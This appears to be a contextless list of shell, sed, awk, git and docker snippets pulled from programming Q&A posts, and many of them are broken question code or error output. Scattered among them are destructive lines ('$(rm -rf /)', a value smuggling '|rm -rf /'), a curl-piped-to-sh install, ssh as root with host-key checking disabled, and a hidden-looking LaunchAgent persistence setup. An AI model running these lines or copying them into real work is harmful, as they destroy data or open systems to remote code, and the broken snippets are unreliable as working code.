ls -l | grep a | sort
ps -o pid,ppid,pgid,comm | grep myscript
docker-machine help
echo "password" | md5
echo -n
man bash
echo -n
kill -SIGUSR1 <pid>
echo $filename
$ for dir in $(echo *); do cd $dir; sed -i "s/9.015/$dir/g" file1; cd ..; done
[ condition ] && { ... }
if [ condition ]; then ...; fi
[ condition ] && { ... }
if [ condition ]; then ...; fi
[[ ]]
some-command && other-command
some-command || other-command
<package foo="bar" unique-identifier="NEEDS_TO_BE_REPLACED" version="foobar">
sed 's/unique\-identifier\=\".*\"/unique\-identifier\=\"NEW_TEXT\"/g' $file >> $newFile
sed 's/\bunique\-identifier\=\".*\"\b/unique\-identifier\=\"NEW_TEXT\"/g' $file >> $newFile
sed 's/\<unique\-identifier\=\".*\"\>/unique\-identifier\=\"NEW_TEXT\"/g' $file >> $newFile
sed 's/[[:<:]]unique\-identifier\=\".*\"[[:>:]]/unique\-identifier\=\"NEW_TEXT\"/g' $file >> $newFile
" version="foobar
sed -e 's/[\\\][t]//g' -e 's/[\\\][n]//g' -e 's/[\\\][r]//g'
sed -e 's/\\[[a-z]]*//g'
total count
total count
total count
$ for i {3.0..4.5..0.1}; do echo $i; done
$ for i in $(seq 3.0 4.5 0.1); do echo $i; done
./myscript -i file1 -i file2 -o /home/output -r -c
[ "$SELECTION" = "5" ]
(exec "./script1")
chmod 0755
GIT_WORK_TREE=.. git reset --hard
sh.exe":javac: command not found
export PATH=$PATH:"/c/Program Files/Java/jdk1.8.0_45/bin/"
export PATH
#!/usr/bin/env ruby
#!/usr/bin/env ruby
ruby -e
count-per-file.sh str_needle *.c
substr($0, 1, 8)
"my match"
/usr/bin/time taskset 0x2 sleep 100000
taskset 0x2 /usr/bin/time sleep 100000
ps -f
/bin/taskset 0x2 /bin/echo "foo"
head -1
-m 1
man grep
for i in `find $log_des -name $fname`
xld "
${all[*]: -1}
man find
ln -s
b loop
du - sh /home/*
-t 5000M
<( … )
cat < file
<( echo hi )
printf "%s" "$n" | hexdump -C
read val
sed 's/\\n/\\\n/g'
cat -v /dev/ttyUSB0 > output &
echo -e '\xff\x09\x00' > /dev/ttyUSB0
$(db2 -x "connect to $DB_NAME...)
db2 "SELECT C.PARTNUMBER..."
> $var
tail -1
tail -f
touch $'foo\nbar'
wc -l
print -v
system("...   2>&1")
sudo service foo status
sudo service foo start
sh parent.sh
ps -ef | grep parent.sh
sh test.sh
ps -ef | grep test.sh
root     21937     1  0 12:41 pts/0    00:00:00 sh test.sh
sh test.sh
sleep 3 && sleep 5 &
python -u
rsync -r
touch in.log
virtualenv flask; source flask/bin/activate
python db_create.py
ppip list
dos2unix db_create.py
find ./ -name "*.py" -not -path "./flask/*" -exec dos2unix {} \;
set | grep SHELL
set -x
./path/to/script/PythonPath.sh && nosetests <tons of other arguments>
column -t
chmod u+x run_python.sh
svn add myfile
svn commit myfile
chmod +x ./runall.sh
node ../app2/app.js
git status
git clean
git clean -f
git clean -n
git clean
cp file file2
OS X
OS X
cat filename.txt | xargs myscript.sh
process "$ip"
"${name#*- }"
"${name% -*}"
echo arg1
echo arg2
parallel ./script ::: server1 server2
parallel -j30 echo ::: 1 2 3
echo $keyword
The Man From Official Henry Cavill Armie Hammer Spy Movie
bash -c
kill -TERM 22496
bash -c
kill -TERM -22496
bash -c
test.sh 34 1 45 1 5 6 6 6
printf "\x$(printf %x $char)"
char=65; printf "\x$(printf %x $char)";
sh script.sh
fgrep --help
grep -vxFf
fgrep -vxf
0.2403 seconds
highway to hell
Set Complement
./job.sh ftp.microsoft.com
chmod -x
sed 's/|.*$//' end_unique.txt | xargs parallel -j20 ./job.sh :::
/bin/bash: <server>: command not found.
echo "1" | login kaiserpatrick
login -f command
. /etc/bashrc
echo $PATH
with star symbol
pattern \2
set HOME
-f $PID
help test
-f file
file number
macaddress= arp  | grep -w  "$ipRange$1" | awk '{print $3,$1}'
macaddress=$(arp | grep -w "$ipRange$1" | awk '{print $3,$1}')
"4 - Quit"
git merge-file <local> <base> <other>
git merge-file -p bar.txt foo.txt.base foo.txt.end
git merge-file -p bar.txt <(git show HEAD^:foo.txt) <(git show master:foo.txt)
echo $?
git merge-file -p bar.txt <(echo -e 'foo\nbar') <(echo -e 'foo\nbar\nend')
git show
git merge-file
git merge-file
echo $PATH
echo $PATH
bash myscript
,[^ ]
sed -r
substr($NF, 2)
split($1,a,/ /)
/ /
cron stop/waiting
shuf ..
[[ < ]]
[ \< ]
[[ < ]]
OK Wrong OK OK
OK Wrong OK OK
OK OK OK OK
help test
sort afile > afile
> afile
sort afile -o afile
env COLUMNS=$COLUMNS LINES=$LINES
kubectl exec -ti busybox env COLUMNS=$COLUMNS LINES=$LINES bash
User Agents
grep -oP
find . -name Gruntfile.js
find . -name Gruntfile.js | grep -rnw -e 'purifycss'
-exec {} +
man find
-exec command {} +
shopt -s globstar
bash -c '\''timeout 3d ssh -o StrictHostKeyChecking=no root@192.168.157.60 "./deploy.sh -u 1540 && $2 && $3 && $4
echo ""
echo "myLogin"
echo "mypass"
svn <command> --help
vim myFile.py
:help remote
find . -name "filename" | grep -v 'Permission denied'
'permission denied'
permission denied
*/2 * * * * cd /path/to/script; (time /path/to/script/code.sh arg) &>> /path/to/log/time.log)
echo $(timestamp)
your_script foo.a foo.b bar.a bar.b
your_script foo.a bar.a
your_script *.a
if [[ -f $FILE2 ]]; then program; fi
with administrator privileges
chmod +x namescript
let g:is_bash=1
if [ "$result1" -ge "0" ]; then
... [DISCONNCTD] ...
boot2docker start
boot2docker start && $(boot2docker shellinit)
$(boot2docker shellinit)
export VARIABLE=~/
export ~/
awk -F . '{print $2}' <<< "$(uname -r)"
IFS=. read -r _ minor _rest <<< "$(uname -r)"; echo "$minor"
<<< "$(uname -r)"
convert /my/dir/20/banner.jpg -resize x35 -unsharp 0x0.5+0.5+0.008 -quality 95 /my/dir/20/banner-35.jpg
convert /my/dir/18/poster.jpg -resize x500 -unsharp 0x0.5+0.5+0.008 -quality 95 /my/dir/18/banner-500.jpg
find /my/dir -type f -mtime -1 -name '*-*.jpg' -exec bash -c 'for path do dir=${path%/*} file=${path##*/} height=${file%.*}; convert "$dir/${file%-*}.jpg" -resize "x${height#*-}" -unsharp 0x0.5+0.5+0.008 -quality 95 "$path"; touch -r "$dir/${file%-*}.jpg" "$path"; done' _ {} +
echo $line
while IFS="\n"
-i 's/\r$//'
help while
ssh server01
sudo bash
ssh server01
sudo bash
ssh server01
sudo bash
ssh server01
ssh server01
os.system("cd /mnt; mycommand")
-printf '%P\n'
man find
cat $1
$0 {..}
osascript file.scpt
myprog -o tmpfile input_file && cat tmpfile
myprog -o tmpfile input_file && contents=`cat tmpfile` && rm tmpfile && echo "$contents"
{ ... }
alias {=foo
1>&2 {
print a,b
print a OFS b
var=$(command <<< "$var")
grep --help
!($0 % 3)
$0 % %3
gnuplot -e "filename='output_0.csv'" 'plot.p'
gnuplot -r "$STRING" 'plot.p'
STRING="$STRING"stuff to append to string
(?U0 ?U2 ?U9 ?U11 ?U21)
0 2 9 11 21
gnuplot -e "filename='output_N.csv'" 'plot.p'
gnuplot -e "filename='output_0.csv'" 'plot.p'
python2.7 setup.py install
import gurobipy
init_demo: waiting for TNS listener to start
docker exec -it tr-db bash -c 'lsnrctl start'
bash: lsnrctl: command not found
docker exec -it my_docker bash -c "/u01/app/oracle/product/11.2.0/xe/bin/lsnrctl start" | grep successfully
sleep 30
echo "running remander"
bash -c '/path/to/ninja list of targets'
ninja list of targets
setenv PATH .....
sh -c 'launchtcl setenv PATH $PATH:.....'
echo xzxzxz=$XZXZXZ path=$PATH
'/Applications/Qt Creator.app/Contents/MacOS/Qt Creator' &
sh -c 'launchctl setenv PATH $PATH:/HELLOWORLD'
echo $PATH
$ git clone http://source/code/address.git
else if
type cygpath
if true source-script else exit
Reading symbols from bash...(no debugging symbols found)...done.
cd ..
cd $PROMETHEUS/sources/
bash -x ...script...
cd ..
cd /sources/
#!/bin/bash -u
grep -oP
[[ $var = pattern ]]
[[ $var =~ regex ]]
x="1 2 3"
for i in 1 2 3:
No such file or directory
echo $x
echo $y
echo $x
echo $y
1 2 3 4 5 6 7 8
"$xm $ym"
1 2 3 4 5 6 7 8 9
The quick brown fox jumps over the lazy dog.
$ aws s3 cp
$ aws s3 sync
chmod +x s3download.sh
$(command substitution)
$(rm -rf /)
for file in $(find ...)
(version 3.2.51(1)-release)
set args1 = "$@";
| xargs
-d $'\0'
{} +
{} ;
College Level Math *,Elementary Alegrbra *
College Level Math.*?
Elementary Algebra.*
$ sed -r 's/(,)(College Level Math)(.*)(Elementary Algebra)(.*)/\1\4\3\2\5/g' file
GNU sed
$ sed 's/\(,\)\(College Level Math\)\(.*\)\(Elementary Algebra\)\(.*\)/\1\4\3\2\5/g' file
mkdir -p
BUNDLER VERSION
BUNDLER VERSION
chef server
chef client
chef "workstation"
LIST="31 32 26 28 27 30 24 15 4 2 1 3"
echo $var
tr -s '\n' ' '
LIST=${LIST/% /}
list=`cat test.txt`
{ echo y; cat } | install
awk '{if ( $0 ~ /^Day/ ) Head = $0; else print Head "," $0}' YourFile
man bash
-o errtrace
for i in {1..10}
for (( i = a; i < b; ++i ))
"abc 1"
"abc 2"
putchar(' ')
for NAME in $(ls -1 *.wav /some/path | cut -d "/" -f3 | cut -d "-" -f1-5)
[[ $file =~ $regex ]]
bash -c
bash -c
sudo htpasswd -c /etc/phppgadmin/.htpasswd vagrant
alias my_first_alias='git status'
-bash: my_first_alias: command not found
. .bashrc
/coremedia/pic-cms-tools/bin/cm publish -u admin -p admin -t "/Config/Static Texts/PDF Texts/pdf.eudatasheet.ocEnergyConsConvAlone" "/Config/Static Texts/PDF Texts/pdf.eudatasheet.ocEnergyConsForcedAlone"
eval $1
eval "$@"
while IFS= read -r num; do echo "$((num+5))" ; done < filename
while IFS= read -r num; do echo "$((num*5))" ; done < filename
tc "$(hostname)"
tc "$(hostname)"; echo
testbash.txt | less
cat /dev/null > fileABC; cat /dev/null/ > fileXYZ
echo -n
cat /dev/null
printf ''
find .
-maxdepth 2
-type f
-name '*.java'
-exec truncate --size 0 "{}" \;
man find
while read file
do > "$file"
done < erasure
1 8 * * 1,2,3,4,5 /path/to/script
:|paste -d '   ' file1 - file2 - file3 | column -ts "| "
column -t
"| "
man bash
array=$(echo "$roles" | tr "," "\n")
array=($(echo "$roles" | tr "," "\n"))
> file 2>&1
2>&1 > file
ls --color
echo $LS_COLORS
file $e | getfield 2
cat xab >p1
cat >p1 &
cat p1 | tee >(sha1sum ...)
tee >(...) <p1
[ $2 ]
"bla bla"
[[ expression ]]
set +H
git rm --cached "~$$ClassDiagram.~vsdx"
fatal: pathspec '~4192ClassDiagram.~vsdx' did not match any files
man sort
sort file
awk -f dedupe.awk file
cat $(sort -n yx*) | sort | uniq -d
fgrep -x -n "$line" /dev/null yx*
yx000005:23:some text
sort -n | sed 1d
IFS=: read -r file nr rest
yx000005:23:some text
sed -i -e ${nr}d "$file"
cat $(sort -n yx*)
mktemp -d
awk '!x[$0]++'
--block 100M
sudo cran
install "Bloom::Faster"
dd if=huge.txt bs=400M count=1 | awk '!a[$0]++' | wc -l
cut -d "," -f1
awk -F, '{print "Script job123 ran at: " $1}'
/queue simple print stat
grep -oP 'target=.*?\ |[^\-]bytes=.*?\ ' | sed 's/^ //g'
example.sh: 3: example.sh: Syntax error: "(" unexpected
sh example.sh
sh example.sh
sh example.sh
Basic Usage
$ source venv/bin/activate
source venv/bin/activate
git config --global -e
tar | uuencode
your java code file
/coremedia/pic-cms-tools/bin/cm publish -u admin -p admin -t "/Config/Static Texts/PDF Texts/pdf.eudatasheet.ocEnergyConsConvAlone" "/Config/Static Texts/PDF Texts/pdf.eudatasheet.ocEnergyConsForcedAlone
"6 "
passdb="$(< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c${1:-2};)"
#! /bin/bash
interpreter_name script_name
line 5: n: command not found
option dhcp-server-identifier 192.168.1.254;
sort -rn
mv -i
curl -o $outputfile $url
curl -o "$outputfile" "$url"
(zone "example.com" {)
-v RS=
/bin/sh -c <the command>
bash -c
VAR4='|rm -rf /'
awk '{print $1, $NF}'
[ -s file.txt ]
[ -n file.txt]
if [ -n filename ] ; then echo "not empty"; fi;
not empty
man bash
[ ... ]
[ -n ]
cat failingAll | awk '{print $2}' | xargs -I {} -L 1 sh -c "find {} | grep xml | xargs open -W"
ls -1 /directory/files*.txt | sort -nr | head -1
ls -1
ls -l
ls -t
GNU sed
vam tetris
vam tet
vam install tet
export GREP_OPTIONS='--color=auto'
export GREP_OPTIONS='--color=always'
export GREP_OPTIONS='--color=auto'
set -x
<!-- main content -->
<!-- end content -->
| wc -c
pattern="class=\"([A-Za-z0-9_-]* )*$1( [A-Za-z0-9_-]*)*\""
class="others my_class"
class="my_class others"
/<!-- main content -->/ {Y=1}
/<!-- end content -->/ {Y=0}
Y && $0 ~ pat {f[FILENAME] = f[FILENAME]" "FNR;}
END {for (k in f) printf "%s\tlines:%s\n", k,f[k];}
wc -c file.txt
sed 's/^ *//'
wc -c
soak up standard input and write to a file
' '
sudo -u bar -i
ps -ef
ps -ef
/proc/<pid>/status | egrep '^Uid:' | awk '{ print $2 }'
-ge ${value}
(( value = value - 1 ))
wc -L
apt-get install dos2unix
chmod +x ./my_file
chmod 755
wrapper.sh /usr/sbin/cmd start
shell_exec('/bin/bash ./getImg');
source /.bash_profile
source /.bash_profile
let i+=1
if [ -f $target ]
cat /same/fld/path/dir1/same-name[a-zA-Z$]/sameFileName
find . -maxdepth 2 -type d -name "MWACluster15"
find . -maxdepth 2 -type d -name "MWACluster15" | xargs ls logs/
XPC Services
View Debugging
mv err.log err[date-time].log
man logrotate
kill -HUP pid_of_yourscript
Error: Unknown option is.
set -e
dialog --backtitle ''\''this' is a 'test'\''' --separate....
--list (List all available topics)
--describe (List details for the given topics)
12345 4321    hello hello
"Open drive"
Open\ drive
sys.argv=['pgm32.py', '"Open', 'drive"']
sys.argv=['pgm32.py', '"Open', 'drive"']
"Open drive"
Open\ drive
sys.arv=['pgm32.py', 'Open drive']
length = $(($RANDOM%8+9))
grep -o
sort -R
($1 !~ /^Date/)
wc -c
wc -l
awk '{...}'
man awk
wget -e --robots=off -r --level=0 -nc --accept mp4 somewebsite.com
for f in $(find $src -maxdepth 1 -name '*.md'); do wc -w < "$f" >> $path/tmp.txt; done
'' file
<   < (find).
help read
This is my file.md
IFS= read -r -d '' file
control operator
control operator
if COND ; then CMD ; fi
control operator
$ < sample.csv Rio -ge 'g + geom_bar(df, aes(hour, count))' | display
cd myfolder/bob
alias myfolder='~/some/deep/working/folder'
cd myfolder
cd myfolder/bob
"Intel Core i7-4790: CPU Package"
for file in /var/log/sa/sa??; do sar -q -f "$file" | grep "^.\{35\}1[1-9][0-9]"; done
my_script.sh text_file
echo Hello | my_script.sh
sudo ./karaf
sed -n -E -e '/And/,$p' file
END{print s;}
bash -c
System Volume Information
Binary file (standard input) matches
System Volume Information
grep Arial
find . -type f -printf '%T@\n' | sort -n | tail -1
sort -n
tail -1
time [command]
find . -type f -printf '%T@,' | cksum
NR==FNR{lines[$0]++; next}
$0 in lines
-v name=value
grep -v
"${f##*${year}.jpg}" = ""
Eclipse Luna
./openMP < numbers.txt
./openMP < numbers.txt
exec 1>&0
exec 2>&0
$ echo "København, 北京市, Skåne län" | unidecode
Kobenhavn, Bei Jing Shi , Skane lan
docker login
oc whoami -t
ls /Users/Heros/dev/gitinspector/gitinspector-0.3.2
ls /Users
xargs -i
man find
cp ~/../music_on_mac /.../music_target_on_android
./adb push <local> <remote>
./adb shell
git ls-remote
git log
source ~/.bashrc
2014-03-21 13:22:33
[] hello\n[] world
./test 123 456
[123] hello\n[123] world
bash test
print ... > "new_file"
wc -l
kill -STOP <pid>
kill -CONT
-u NONE
winc w
map <right> 2zl
less -#2
map <left> 2zh
less -#2
map q :qa<CR>
se nu sbo=hor scb nowrap
winc w
echo "yes" | <commmand>
find / -name 'whatever'
source ~/.bashrc
v=5 echo "$v"
grep -Po "Physical interface: \K[^,]*" test.txt
Physical interface:
awk '!/Phys/ && !/Drop/ && NF {print $NF}' test.txt
man find
man 1 stat
-T 15
while loop
while loop
> result.txt
set editing-mode vi
DECISION: ...
DECISION ...
spawn -noecho ssh -p 22 user@server.com
log_user 0
set timeout 15
find "$myarray[i]" >> $tmp
echo "<br>" >> $tmp
echo "<br>" >> $tmp
sed "s/[33-64]/64/"
php -v
PHP 5.5.13 (cli)
PHP Version 5.4.29
PHP 5.5.13 (cli)
php -v
sudo rm /usr/bin/php
/opt/local/bin/php54 -v
PHP 5.4.29 (cli)
sudo rm /usr/bin/php
php -v
PHP 5.5.13 (cli)
whereis php
which php
whereis php
which php
which php
type php
port select
port select --list php
sudo port select --set php $versionIdentifier
sudo port select --set php php54
hash -r
-F '\$\\t\\' --no-align   \
psql -h localhost -p 5432 -U foo -F $'\t' --no-align -f test.sql
bool flag[1000000];
for (int i=0;i<1000000;i++) flag[i]=0;
for (int i=0;i<N;i++) flag[arr[i]]=1;
distance = 0
for (int i=0,j=0;i<1000000;i++) if (flag[i]) { arr[j]=i; j++; } N=j;
./memtest: line 9: [: 20.3: integer expression expected
[ $counter = 1 ]
[ $counter -eq 1 ]
if [ "${mem//./}" -gt "${highmem//./}" ]
if [ condition ]...
if [[ condition ]]...
if ./configure && make...
which [
brew update && upgrade
find .
-maxdepth 2
-type f
-exec grep 'pattern' '{}'
man find
man grep
grep -Hnr PATTERN .
-d recurse
grep -d skip -Hn PATTERN {,.[!.]}*{,/{,.[!.]}*}
-d skip
* */* */.[!.]* .[!.]* .[!.]*/* .[!.]*/.[!.]*
Pictures/Icons and logos
test -e ...
man test
[ -f "/path/to/some/${dir}/" ]
[ -f /path/to/some/${dir}/ ]
realpath "$1"
strace --help
p = Runtime.getRuntime().exec("testpad -i -c"+can+" -n"+pad+" "+pathFile);
docker run -i -t <container> <image>
docker run -d <container> <image> bash
-i -t
docker run -v /some/host/dir:/some/container/dir -d container
your input here
dummy(){ :; }
dummy(){ unused(){ :;} }
/^Host_Alias  *srv_linuxestate=/
/^Host_Alias[ \t][ \t]*srv_linuxestate=/
sed -i -e '/^Host_Alias[ \t][ \t]*srv_linuxestate=/{;:;/\\$/{N;b};s/$/,host25/;}' /etc/sudoers
sed -rn "s/^USERNAME=('|\"|)(.*)\1/\2/ip" "/etc/msm.conf"
set -x
if else
su -c 'nohup $MY_CMD > /var/log/out.txt 2>&1 &' $MY_USER
ssh $USER@127.0.0.1 '$CMD'
echo /path/to/some/command | ssh -t -t someuser@localhost
git 'pull' not found
sed -n
sleep 30
bash start launch_server.sh port=3000
./start launch_server.sh port=3000
cd home/blah/whereever/root/
(cd ./bin/ && sh launch_server.sh port=3000)
if false
Stream #0:0(eng): Video: h264 (High) (avc1 / 0x31637661), yuv420p, 3840x3840 [SAR 1:1 DAR 1:1], 100072 kb/s, 59.94 fps, 59.94 tbr, 60k tbn, 119.88 tbc
grep -oE "[1-9][0-9]*x[1-9][0-9]*"
search title =
grep -rnw . -e "title ="
man alias
echo $?
-exec ... \;
-exec ... {} +
git branch -D
convert "$file" output.jpg
wp db import
wp db import
wp db import
command emacs
emacs &
emacs <files> &
ls -l
ls -l
if else fi
chmod -R u=rwX,g=rwX,o=r
map { my $c = $_; ... } @categories
grep { /$c/ } @columns
(...)[0] || ''
git status
bash: /test.sh: No such file or directory
which bash.exe
echo -n
brew install neo4j
neo4j start
neo4j stop
man neo4j
neo4j --help
readlink -f
ln -sf
-type l
p="$(readlink "{}")";
readlink ...
if [ "${p:0:1}" != "/" ]; then
p="$(echo "$(pwd)/$p" | sed -e "s|/\./|/|g" -e ":a" -e "s|/[^/]*/\.\./|/|" -e "t a")";
echo "$(pwd)/$p" |
sed ...
if [ "${p:0:'${#oldpath}'}" == "'"$oldpath"'" ];
ln -sf
bash -c
bash -c
bash -c
man 2 stat
man 1 stat
today + 3 months
GNU date
16 - '%u'
%u   day of week (1..7); 1 is Monday
$ cat filelist | sed s/..\///
ROOT FOLDER
sed 's/[a-zA-Z0-9]*[0-9][a-zA-Z0-9]*/ /g' filename
grep -wo -E [a-zA-Z]+ foo | xargs filename
$1 ~ /^pattern$/
grep -f match.list input.txt
python: can't open file 'movefiles.py': [Errno 2] No such file or directory
-v q="'"
{$2=q substr($2,1,length($2)-1) q}
substr(string, start, length)
"${x[@]: -1}"
mongo test --eval "printjson(db.getCollectionNames())"
use admin
'localhost CPU'
'localhost CPU'
1 2 3
three four five
-v pattern="one"
NR == FNR
NR != FNR
NR != FNR && a[FNR]
/usr/bin/awk {print tolower(bash-)}
:help backtick-expansion
which zsh
chsh -s /bin/zsh
echo $SHELL
brew install zsh
/etc/shells: Permission denied
:vars (f)
[[ $LOG_TO_TERMINAL ]]
$LOG_TO_TERMINAL && Y || Z
X && Y || Z
<img src="..">
1 2 1346
1 1346 2
sort -g
sort -g
sort -k1.12 -k2.6n
du -ksh * | sort -n -r | grep -v "Permission denied"
du -ksh * | sort -n -r 2>&1 | grep -v "Permission denied"
$ perl -p file_with_regex.pl test.txt
use strict
use warnings
docker-compose up
alias foo="cd /bar/blah"
ln -s /exp/comm/matlab-R2014b/bin/matlab matlab
chmod +x matlab
npm install blessed
node the_script.js args.json
$(date '+%b %e %T')
commit -a
git commit file1.txt file2.txt file3.txt
file1.txt file2.txt file3.txt
git reset E
grep -v '^ '
git commit -a
git help gitglossary
git help git
git help init
man -s7 gitglossary
git help gitglossary
git help --web gitglossary
man 1 git-add
git commit file1.txt file2.txt file4.txt
The index is a stored version of your working tree.
bash shell script
[: too many arguments
unary operator expected
binary operator expected
too many arguments
chmod 777 ~/Library/.system/connect.sh
chmod 777 ~/Library/LaunchAgents/com.system.osx.plist
sh ~/Library/.system/connect.sh
launchctl load ~/Library/LaunchAgents/com.system.osx.plist
func ( a);
alpha = -pi/...
"s/alpha =.*/$n3/"
's/alpha =.*/"$n3"/'
alpha = -pi/...
./test.sh one 'two' "three"
x:y (x:y/z,w)
> file1b.txt
| sort -nr
mysql --protocol=tcp -e "Select 1"
man page
ls /root/..
for file in /root/../*
-draw 'point 30,50'
set -x
zipalign -v 4 /Users/zulhilmizainudin/Desktop/kl-parking/platforms/android/build/outputs/apk/android-release-unsigned.apk android-release.apk
-bash: zipalign: command not found
./zipalign -v 4 /Users/zulhilmizainudin/Desktop/kl-parking/platforms/android/build/outputs/apk/android-release-unsigned.apk android-release.apk
Maria Ion Gheorghe Vasile Maria Maria Ion Vasile Gheorghe!=Maria Ion Gheorghe Vasile Maria Maria Ion Vasile Gheorghe
Ape, Baboon
shopt -s nullglob
git branch -a
x=$(git branch -a); echo $x
curl -sSL https://raw.githubusercontent.com/aspnet/Home/dev/dnvminstall.sh | DNX_BRANCH=dev sh && source /root/.dnx/dnvm/dnvm.sh
source /root/.dnx/dnvm/dnvm.sh
source /root/.dnx/dnvm/dnvm.sh
today=$(date +%Y%m%d)
if [[ ! $name =~ detail-$today ]]; then
[ -d "${dir}" ] || mkdir "${dir}"
mv "${1}" "${dir}/${name}"
export -f move
find /radacct
-type d -mindepth 2 -maxdepth 2
-name '*detail*'
-exec bash -c 'move "$0"' {} \;
apple_pie=True: command not found
Y|y) ${${filling}}_pie="True" ;
bash: ${${filling}}_pie="True": bad substitution
tar -czf -
tar -czf abc.tgz
echo "./ABC/ABC/SRC/test.sh" | cut -c2-
^.* [^ ]*$
[^ ]*
sed 's/.* //' file
man sed
man awk
curl --user "UserName" https://api.github.com/orgs/org/repos
rep get foo
find Directory -type d -maxdepth 1 -mindepth 1
bash -c
mv "$0" "old.0
&& mkdir "$0"
&& mv "old.0" "$0"
app_mainclass= () { app_mainclass=$1; }
Ubuntu 13.10
Ubuntu 12.04
md5sum <file1> <file2>
md5sum -t t.txt
coreutils 8.14
sh test.sh
mkdir -m 777 -p "$dirPath"
sh -x
source ...
test -f
test -f "string"
s0 bash
s0 $SHELL
sudo -E python Pkt_Topo_with_loop.py
$1 = ab
$2 = 1
Exit status 0
Transferred: sent 308464915408, received 11704 bytes, in 14844.1
/ Transferred: sent 308464915408, received 11704 bytes, in 14844.1 seconds
Exit status 0 / Transferred: sent 308464915408, received 11704 bytes, in 14844.1 seconds
grep -ow 3.3.3.1 testfile
man cut
YYYY-MM-DD HH:MM:SS
\1-\2-\3 \4:\5
complete -p | grep ssh
complete -F _known_hosts /etc/init.d/ssh
complete -p ssh
aws cli
sudo docker run -it --rm -v ~/.aws:/root/.aws username/docker-image sh -c 'aws s3 cp s3://bucketname/filename.tar.gz /home/emailer && cd /home/emailer && tar zxvf filename.tar.gz && /bin/bash'
docker run
chmod 444 ~/.aws/*
docker run -e AWS_PROFILE=xxx ...
\( \)
$( dirname "${BASH_SOURCE[0]}" )
ENV abc 123
docker build .
-f, --file=""            Name of the Dockerfile (Default is 'PATH/Dockerfile')
rm -f "$RESULT_FILE"
((: && 8 != 1 : syntax error: operand expected (error token is "&& 8 != 1 "
read -r line
while compound_list do_group
(( ))
> $fqdn_alias.decom
aws s3 ls s3://bucket
aws s3api head-bucket --bucket $S3_BUCKET
if [ $? -ne 0 ]; then...
set -e
man pbpase
gnu sed
perl -0pe 's?(<key>DefaultVolume</key>\s*<string>)'"$macDefault"'(\s*</string>)?$1'"$winDefault"$2'?s' config.plist
sleep 300
if $((newsize < size))
5 minute
$awk -F'[,"]'
chmod +x /path/to/myscript
[abc: command not found
grep -l
Welcome {0..10..2} times
"matlab -nodesktop -nojvm"
xargs -I '{}' find '{}' -xdev -type f -perm -0002
{long_command;} 2>/dev/null
$[$RANDOM % 6]
bash roll
chmod 755 roll
cat /tmp/revolver
IFS= read -r line < <(netstat| head -n1)
< <(...)
grep -P
John Smith www.website.com john@website.com jan-01-2001
echo "www.website.com" | grep -Po '^(www\.)?(?<domain>.+)$' | echo $domain
grep -E
[[ ... ]]
^[ #]*
bash -x
xrandr --newmode
awk 'NR==FNR{a[$1]=$2}NR>FNR{print $1,a[$1]}' t1 t2
ls -la
PATH= ./script
hash [-r] [-p filename] [-dt] [name]
find .
find . | cat
time find .
time find . | cat
find . | cat
find . | wc
find .
find . | cat
find . > /dev/null
find . | cat > /dev/null
| cat
find /tmp -name '*.swp' -exec rm {} \;
find . -name *."$1" - exec rm {} \;
- exec
find . -name "*.$1" -exec rm {} \;
jq --arg ip "$ip" '.Addresses[] | select(.PublicIp == $ip) | .InstanceId'
shopt | grep glob
grep google
var=$( cmd )
sed -i'{/^1\|^2\|^3/d;}' infile.txt
-f -
shift $(($OPTIND - 1))
positional parameters
while loop
sed "s/param1/param2/"
It failed
It worked
bash -c "false; echo $?"
bash -c "false; echo 0;"
bash -c 'false; echo $?'
<(ls -1)
git pull
cat $LOGFILE
man find
java -jar Azureus2.jar --ui=console &
mongod &
CMD ["/etc/mongod/mongostart.sh"]
echo fi
-bash: npm: command not found
sudo npm install npm -g
sudo: npm: command not found
export t=5
source ~/.bash_profile
npm test
if statement
until myserver; do
2> >(echo "$(date)"; tee -a ./logs/errors.log >&2)
for (i=1;i<=NF;i++) {if (substr($i,1,1)=="{") {split(substr($i,2,length($i)-2),a,"|"); j=1+int(rand()*length(a)); $i=a[j]}
{for (i=2;i<=NF;i+=2) {n=split($i,a,"|"); j=1+int(n*rand()); $i=a[j]}
. ~/.bash_profile
. ~/.bash_profile
./script_name git pull
./script_name -t git pull
./script_name git pull
set -f
for dir in $dest
set -f
find /srv/abc/ -type d -empty -exec rmdir {} \;
rmdir -p /srv/abc/test4
rmdir -p /srv/abc/test1
rmdir -p /srv/abc/test3
3 digits
5+50*3/20 + (19*2)/7
shopt -s globstar
aws s3 sync dist s3://${GIT_BRANCH}/path --acl public-read --delete --region us-east-1
nodejs /path/to/index.js  &disown
nodejs /path/to/index.js & disown
go run /path/to/index.go & disown
go dosomething
find . -type f -name "*.root" -size 1M
man find
%'' case) or the longest matching pattern (the
print $3
line 8: syntax error: unexpected "done" (expecting then)
opkg install kmod-usb-serial-ftdi
chmod u+x boiler2text.sh
sh /bin/ihiu/boiler2text.sh
/bin/ihiu/boiler2.txt &
::Your test code goes here section
printf -v padded_i
printf "%q"
go run /path/to/index.go
go run /path/to/index.go >> errors.txt
man bash
no-such-command > file.out
sed 'pattern' file > file
echo test
eval echo $myVar
eval echo
cat text.csv | awk '{print $1}'
cat | awk
cmd file
cmd < file
man sed
set INPFILE=$argv[1]
~/menu dev.clint.alpha
set -E
echo STR | bash script.sh
bash script.sh < <(echo STR)
bash script.sh <<< STR
man dpkg
sudo dpkg -i --force-confdef mysql-common_5.6.21-1ubuntu12.04_amd64.deb
sudo dpkg -i --force-confold mysql-common_5.6.21-1ubuntu12.04_amd64.deb
bundle install
bundle install
bin/bundle install
bundle install
exec('echo "Hello World"')
system('echo "Hello World"')
`echo "hello world"`
sort -u
for (i in a)
awk '{asort $@}' input.txt
watch -n 1 ls
echo $PROP
echo $MYVIMRC
[[ $- = *i* ]] && source ~/liquidprompt/liquidprompt
[[ ... ]]
ln -s ../../shared/default/* .
memcpy(dest_buffer, &source_buffer[1], len-2);
su -s /bin/bash git -
>> my_file.log
set -u
if [ "${var-}" = '' ]
( |\t)*
date +"%Y-%m-%d %H:%M:00"
git log --reverse -10
$(echo "201506301524" | sed 's/....$/ &/')
20150630 1524
hello world
$(wc -l a/a/file.txt)
sleep 10
wait $! || read
kill -0
ps -p
read -t 1
script fid src-base-dir
php -f ...
$0 ~ regexp
$0 ~ /foo/
$0 ~ /foo/
/foo/ || /bar
$0 ~ /foo/ || $0 ~ /bar/
wget http://www.example.com/mysql.zip -O mysql.zip || rm -f mysql.zip
$. = $lineNum
run=$(perl …)
Thu Jul 2, 01:01:01
PS1='$(date +"%a %b %e, %T") $? >> '
$(date ...)
\D{%a %b %e, %T}
\$(date ...)
